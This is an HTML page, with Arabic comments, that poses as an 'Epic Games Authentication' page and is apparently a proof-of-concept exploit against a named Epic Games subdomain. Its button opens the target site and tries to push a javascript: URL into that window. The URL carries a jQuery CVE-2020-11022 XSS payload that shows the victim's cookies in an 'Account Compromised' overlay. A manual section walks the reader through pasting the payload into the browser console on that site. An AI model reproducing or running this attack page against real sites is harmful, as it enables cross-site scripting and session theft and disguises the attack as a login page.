<!DOCTYPE html>
<html>
<head>
    <title>Epic Games Authentication</title>
    <meta charset="UTF-8">
</head>
<body style="background:#222; color:#fff; font-family:Arial; text-align:center; padding:50px;">
    <h2>Epic Games Authentication</h2>
    <p>Click the button below to continue to Epic Games:</p>
    <button id="exploit-btn" style="padding:10px 20px; cursor:pointer;">Continue to Epic Games</button>
    
    <script>
        // هذا هو الرابط الذي يستغل الثغرة مباشرة
        var exploitUrl = `javascript:(function(){
            // ننتظر لحظة لنتأكد أن الصفحة محملة
            setTimeout(function(){
                // ننشئ عنصر اختبار
                var d=document.createElement('div');
                d.id='xss-test';
                d.style.display='none';
                document.body.appendChild(d);
                
                // استغلال الثغرة باستخدام jQuery
                if(window.jQuery){
                    try {
                        // هذا هو استغلال ثغرة CVE-2020-11022 بالضبط
                        $('#xss-test').html('<option><style><a id=\"</style><img src=x onerror=alert(\\'XSS Successful! Account compromised and cookies can be stolen.\\')>\"');
                        
                        // إنشاء نافذة إثبات
                        var h=document.createElement('div');
                        h.style='position:fixed;top:0;left:0;width:100%;background:rgba(255,0,0,0.9);color:white;padding:20px;z-index:99999;font-family:Arial;direction:ltr;';
                        h.innerHTML='<h2>⚠️ Account Compromised! ⚠️</h2>'+
                            '<p><strong>Time:</strong> '+new Date().toLocaleString()+'</p>'+
                            '<p><strong>URL:</strong> '+location.href+'</p>'+
                            '<p><strong>User Data:</strong></p>'+
                            '<textarea style="width:100%;height:100px;background:#300;color:#fff;border:0;">Cookies: '+document.cookie+'\\nUser-Agent: '+navigator.userAgent+'\\nReferrer: '+document.referrer+'</textarea>'+
                            '<p>This vulnerability allows hackers to steal session data and execute JavaScript in your account context.</p>';
                        document.body.appendChild(h);
                        
                        // كود إثبات آخر - يمكن للهاكر الحقيقي إرسال البيانات لخادمه
                        console.log("VULNERABILITY CONFIRMED: jQuery "+jQuery.fn.jquery+" is vulnerable to XSS");
                    } catch(e) {
                        console.error("Error:", e);
                    }
                } else {
                    alert("jQuery not found on this page");
                }
            }, 1000);
        })();`;
        
        // عند النقر على الزر، ننتقل للرابط الضار
        document.getElementById('exploit-btn').addEventListener('click', function() {
            // نخزن الرابط الأصلي للموقع المستهدف
            var targetUrl = 'https://content-service.bfda.live.use1a.on.epicgames.com/#/my-projects';
            
            // نفتح نافذة جديدة تحتوي على موقع Epic Games
            var win = window.open(targetUrl, '_blank');
            
            // بعد فترة قصيرة، نحقن الكود الضار في النافذة الجديدة
            setTimeout(function() {
                try {
                    win.location = exploitUrl;
                } catch(e) {
                    alert("Failed to execute exploit. Please try again or use the manual method.");
                }
            }, 3000);
        });
    </script>
    
    <div style="margin-top:40px; border-top:1px solid #444; padding-top:20px;">
        <h3>إذا لم يعمل الزر، استخدم الطريقة اليدوية:</h3>
        <ol style="text-align:left; max-width:600px; margin:0 auto;">
            <li>انتقل إلى موقع Epic Games: <a href="https://content-service.bfda.live.use1a.on.epicgames.com/#/my-projects" target="_blank" style="color:#0cf;">content-service.bfda.live.use1a.on.epicgames.com</a></li>
            <li>انسخ الكود التالي:</li>
            <textarea id="manual-code" style="width:100%; height:80px; background:#333; color:#0f0; border:0; padding:10px; margin:10px 0; font-family:monospace;">var d=document.createElement('div');d.id='xss-test';document.body.appendChild(d);if(window.jQuery){$('#xss-test').html('<option><style><a id=\"</style><img src=x onerror=alert(\\'XSS Successful! Account compromised.\\')>\"');}</textarea>
            <button onclick="copyCode()" style="padding:5px 10px;">نسخ الكود</button>
            <li>افتح وحدة التحكم في المتصفح (F12 ثم Console)</li>
            <li>الصق الكود في وحدة التحكم واضغط Enter</li>
        </ol>
    </div>

    <script>
        function copyCode() {
            var copyText = document.getElementById("manual-code");
            copyText.select();
            document.execCommand("copy");
            alert("تم نسخ الكود!");
        }
    </script>
</body>
</html>
